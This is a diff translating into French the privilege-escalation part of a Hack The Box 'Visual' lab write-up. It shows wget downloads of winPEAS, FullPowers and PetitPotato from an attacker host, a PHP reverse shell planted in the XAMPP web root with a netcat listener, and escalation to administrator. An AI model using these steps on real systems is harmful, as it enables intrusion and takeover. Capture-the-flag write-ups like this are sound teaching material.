@@ -212,48 +212,48 @@ Pour trouver les chemins d'escalade de privilèges, utilisons [winPEAS](https://
 
 ![winPEAS location](/images/HTB-Visual/winPEAS-location.png)
 
-Transférer le fichier sur le système cible avec `wget`
+Transférer le fichier sur le système cible avec `wget`.
 ```
 wget http://10.10.14.222:8000/winPEASany.exe -o wpany.exe
 ```
 
-> Use your IP address and replace the port by the one you are using for your server
+> Utilisez votre adresse IP et remplacez le port par celui que vous utilisez pour votre serveur.
 
-Verify that the file is on the target
+Vérifiez que le fichier se trouve sur la cible.
 
 ![winPEAS location on target](/images/HTB-Visual/winPEAS-on-target.png)
 
-You can check the options of the script with `./wpany.exe -h`
+Vous pouvez vérifier les options de winPEAS avec `./wpany.exe -h`.
 
 ![winPEAS options](/images/HTB-Visual/winpeas-options.png)
 
-Run winPEAS with the options you want, Because I want a somewhat thorough enumeration I am using this command
+Exécutez winPEAS avec les options que vous souhaitez. Parce que je veux une énumération assez complète, j'utilise la commande suivante
 ```
 ./wpany.exe domain systeminfo userinfo processinfo servicesinfo applicationsinfo networkinfo windowscreds browserinfo filesinfo eventsinfo quiet
 ```
 
-It seems that we have permissions to the directory containing the Apache HTTP Server service
+Il semble que nous possédons les permissions pour accéder au dossier contenant le service Apache HTTP Server.
 
 ![Apache Server HTTP](/images/HTB-Visual/ApacheServerHTTP.png)
 
-Going through the output you can notice that you have full access to the `xampp` directory (remember this is a PHP application), the same folder storing Apache. 
+En parcourant les résultats, on peut noter que nous avons un accès complet au répertoire xampp (rappelez-vous qu'il s'agit d'une application PHP), le même dossier que celui dans lequel Apache est stocké.
 
 ![xampp directory](/images/HTB-Visual/xampp-permissions.png)
 
-We can attempt to learn more about `ApacheHTTPServer` with
+Nous pouvons essayer d'en savoir plus sur `ApacheHTTPServer` avec
 ```
 Get-CIMInstance -Class Win32_Service -Filter "Name='ApacheHTTPServer'" | Select-Object *
 ```
 
-This is the output we get, it seems like it runs under `NT AUTHORITY\Local Service`
+Voici le résultat que nous obtenons, il semble qu'il s'exécute sous `NT AUTHORITY\NLocal Service`.
 
 ![Apache HTTP Server service info](/images/HTB-Visual/AppacheHTTPServer-info-1.png)
 
-> "On Windows 10, the UPnP Device Host service is configured to execute without impersonation privileges as the user `NT AUTHORITY\LOCAL SERVICE`...". Basically we can achieve privilege escalation via this account. Read more about it [here](https://itm4n.github.io/localservice-privileges/)
+> "Sur Windows 10, le service UPnP Device Host est configuré pour s'exécuter sans privilèges d'usurpation d'identité en tant qu'utilisateur NT AUTHORITY\LOCAL SERVICE...". En résumé, nous pouvons réaliser une escalade des privilèges via ce compte. Pour en savoir plus, cliquez [ici](https://itm4n.github.io/localservice-privileges/).
 
-The service runs under `NT AUTHORITY\Local Service` so we need to escalate to that account. Since we have access to the `xampp` directory we can plant a reverse shell there and access it through the web browser. I go to that directory and list its content.
+Le service s'exécute sous `NT AUTHORITY\NLocal Service`, nous devons donc accéder à ce compte. Puisque nous avons accès au répertoire xampp, nous pouvons y installer un reverse shell et y accéder via le navigateur web. Je vais dans ce répertoire et je liste son contenu.
 
-> In PHP applications, the XAMPP folder serves as the root directory for hosting web files (such as HTML, PHP, CSS, JavaScript, images, etc.) and managing server configuration settings.
+> Pour les applications PHP, le dossier XAMPP sert de répertoire racine pour l'hébergement des fichiers web (tels que HTML, PHP, CSS, JavaScript, images, etc.) et la gestion des paramètres de configuration du serveur.
 
 ```
 cd C:\Xampp\
@@ -261,91 +261,93 @@ ls
 ```
 ![xampp directory content](/images/HTB-Visual/xampp-content-1.png)
 
-Notice of the `htdocs` folder.
+Remarquez le dossier `htdocs`.
 
-> In XAMPP, the `htdocs` directory serves as the default web server document root. This means that any files placed within the `htdocs` directory will be accessible through a web browser when the XAMPP server is running.
+> Avec XAMPP, le dossier `htdocs` est la racine du serveur web par défaut. Cela signifie que tous les fichiers placés dans le dossier `htdocs` seront accessibles via un navigateur web lorsque le serveur XAMPP est en cours d'exécution.
 
-The application files are here as you can see. We can put a PHP reverse shell in the `htdocs` directory.
+Les fichiers de l'application sont présents, comme vous pouvez le voir. Nous pouvons placer un reverse shell PHP dans le dossier `htdocs`.
 
 ![xampp htdocs directory](/images/HTB-Visual/xampp-htdocs.png)
 
-This is the [PHP reverse shell](https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php) I used. 
+J'ai utilisé ce [reverse shell PHP](https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php).
 
-I then run `wget http://10.10.14.222:8000/revshell.php -o rev.php` to get it to the target.
+Je lance ensuite `wget http://10.10.14.222:8000/revshell.php -o rev.php` pour le transférer sur le serveur cible.
 
 ![PHP reverse shell on the target](/images/HTB-Visual/php-reverse-shell-1.png)
 
-Let's setup a netcat listener with 
+Mettons en place un listener netcat avec
 ```
 nc -nvlp 8010
 ```
 
-> Use the port number that you specified in the PHP reverse shell
+> Utilisez le numéro de port que vous avez spécifié dans le reverse shell PHP.
 
-Go back to the browser and go to `http://<IP address>/rev.php`, come back to your listener and you should have a shell with the user `nt authority\local service`
+Retournez à votre navigateur et allez à `http://<adresse IP cible>/rev.php`, revenez à votre listener et vous devriez avoir un shell avec l'utilisateur `nt authority\local service`.
 
 ![nt authority user shell on the target](/images/HTB-Visual/nt-authority-local-service.png)
 
-Check your privileges and you notice that you lack the `ImpersonatePrivilege` needed to get root privileges.
+Vérifiez vos privilèges et vous remarquez qu'il vous manque le privilège `ImpersonatePrivilege` nécessaire pour obtenir les privilèges administratifs.
 
-Let's run `whoami /priv` to check our privileges
+Exécutons `whoami /priv`.
 
 ![nt authority user privileges](/images/HTB-Visual/nt-authority-priv.png)
 
 ## Escalade des privilèges
 
-This [blog](https://itm4n.github.io/localservice-privileges/) post gives you the link to a tool used to obtain more privileges. The tool is called [FullPowers](https://github.com/itm4n/FullPowers). Get it on the target machine (Make sure to use the reverse shell with `nt authority\local service`)
+Cet [article](https://itm4n.github.io/localservice-privileges/) vous donne le lien d'un outil qui permet d'obtenir plus de privilèges. L'outil s'appelle [FullPowers](https://github.com/itm4n/FullPowers). Téléchargez-le sur la machine cible (Assurez-vous d'utiliser le reverse shell avec `nt authority\local service`).
 
-> We do not want the executable to be accessible through the browser so we `cd ..` back to the `xampp` directory before downloading our file.
+> Ce fichier ne sera pas exécuté via le navigateur, donc nous retournons dans le répertoire `xampp` avec (`cd ..`) avant de télécharger notre fichier.
 
 ```
 wget http://10.10.14.222:8000/FullPowers.exe -o fp.exe
 ```
 
-I get an error because we currently have a cmd shell and not a PowerShell one.
+Une erreur se produit parce que nous disposons actuellement d'un shell cmd et non d'un shell PowerShell.
 
 ![nt authority user shell error](/images/HTB-Visual/shell-error-1.png)
 
-Just run `powershell` and rerun the `wget` command again
+Il suffit d'utiliser `powershell` et de réexécuter la commande `wget`.
 
 ![nt authority FullPowers dlownload](/images/HTB-Visual/powershell-fullpowers-dl.png)
 
-Now we execute `fp.exe` and we get new privileges! Notice that it downgraded us again to a cmd shell and it also forced us out of the `xampp` folder, so we need to run `powershell` again and `cd C:\xampp`
+Maintenant, nous exécutons `fp.exe` et nous obtenons de nouveaux privilèges! Remarquez que nous avons été rétrogradés à un shell cmd et que nous avons été forcés hors du dossier `xampp`, nous devons donc exécuter `powershell` à nouveau et `cd C:\xampp`.
 
 ![nt authority user new privileges](/images/HTB-Visual/nt-authority-new-priv.png)
 
-Now we can use [PetitPotato](https://github.com/wh0amitz/PetitPotato) to achieve privilege escalation by abusing impersonate privileges.
+Nous pouvons maintenant utiliser [PetitPotato](https://github.com/wh0amitz/PetitPotato) pour réaliser une escalade de privilèges en abusant de `ImpersonatePrivilege`. 
 
-We get it to the target by running
+Nous le transmettons à la cible en exécutant
 
 ```
 wget http://10.10.14.222:8000/PetitPotato.exe -o pp.exe
 ```
-However we get an error
+Nous obtenons une erreur
 
 ```
 wget : Win32 internal error "Access is denied" 0x5 occurred while reading the console output buffer. Contact Microsoft 
 ```
 
-It seems that this error is caused by the progress bar displayed on the terminal. It can be solved by running `$ProgressPreference = "SilentlyContinue"` before the `wget` command.
+Il semble que cette erreur soit causée par la barre de progression affichée sur le terminal. Elle peut être résolue en exécutant `$ProgressPreference = "SilentlyContinue"` avant la commande `wget`.
 
-We can now use our file by running
+Nous pouvons maintenant utiliser notre fichier en exécutant
 
 ```
 ./pp.exe 3 cmd
 ```
 ![PetitPotato exploit](/images/HTB-Visual/PetitPotato-exploit.png)
 
-We now have admin privilegs, let's check.
+Nous avons maintenant des privilèges d'administrateur.
 
 ```
 cd C:\Users\Administrator\Desktop
 ```
 
-Then let's list the content of the directory, we got downgraded to a cmd shell again so we have to use `dir` .
+Ensuite, listons le contenu du répertoire, nous avons encore été rétrogradés à un shell cmd, nous devons donc utiliser `dir`.
 
 ![root flag](/images/HTB-Visual/root-flag.png)
 
-We find the `root.txt`! Use `type root.txt` to see it.
+Nous trouvons le fichier `root.txt`! Utilisez `type root.txt` pour voir son contenu.
+
+C'est tout pour mon premier writeup sur Hack The Box! J'espère qu'il vous a été utile. Si vous avez des questions, laissez un commentaire ou contactez-moi sur X [@_KScorpio](https://twitter.com/_KScorpio).
 
 
